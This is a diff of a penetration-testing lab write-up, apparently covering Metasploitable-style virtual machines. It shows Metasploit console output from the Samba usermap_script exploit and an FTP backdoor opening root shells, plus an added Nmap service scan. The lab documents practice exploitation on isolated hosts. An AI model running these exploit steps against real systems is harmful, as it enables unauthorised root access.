@@ -101,7 +101,11 @@ Nmap done: 1 IP address (1 host up) scanned in 142.24 seconds
     msf exploit(multi/samba/usermap_script) >     run
     [*] Started reverse TCP handler on 192.168.0.155:4444 
     [*] Command shell session 1 opened (192.168.0.155:4444 -> 192.168.0.156:57131) at 2025-11-25 00:24:11 -1000
+    ```
 
+    Command `whoami`:
+
+    ```bash
     whoami
     root
     ```
@@ -135,6 +139,11 @@ Nmap done: 1 IP address (1 host up) scanned in 142.24 seconds
     [*] 192.168.0.156:21 - The port used by the backdoor bind listener is already open
     [+] 192.168.0.156:21 - UID: uid=0(root) gid=0(root)
     [*] Found shell.
+    ```
+
+    Command `whoami`：
+
+    ```bash
     whoami
     [*] Command shell session 1 opened (192.168.0.155:39967 -> 192.168.0.156:6200) at 2025-11-25 00:32:01 -1000
 
@@ -142,6 +151,34 @@ Nmap done: 1 IP address (1 host up) scanned in 142.24 seconds
     ```
 
 ## L1 (Normal) - 172.16.0.74
+
+Scanning result:
+
+```bash
+┌──(alonza㉿kali)-[~]
+└─$ nmap -p- -sV 192.168.0.157 -oN fullscan.txt
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-25 00:40 HST
+Nmap scan report for 192.168.0.157
+Host is up (0.00077s latency).
+Not shown: 65524 filtered tcp ports (no-response)
+PORT     STATE  SERVICE     VERSION
+21/tcp   open   ftp         ProFTPD 1.3.5
+22/tcp   open   ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
+80/tcp   open   http        Apache httpd 2.4.7
+445/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+631/tcp  open   ipp         CUPS 1.7
+3000/tcp closed ppp
+3306/tcp open   mysql       MySQL (unauthorized)
+3500/tcp open   http        WEBrick httpd 1.3.1 (Ruby 2.3.8 (2018-10-18))
+6697/tcp open   irc         UnrealIRCd
+8080/tcp open   http        Jetty 8.1.7.v20120910
+8181/tcp closed intermapper
+MAC Address: 08:00:27:BB:1E:0A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: Hosts: 127.0.0.1, SEC-NYCU-PMELIN, irc.TestIRC.net; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 139.93 seconds
+```
 
 ## L2 (Plus) - 172.16.0.97
 
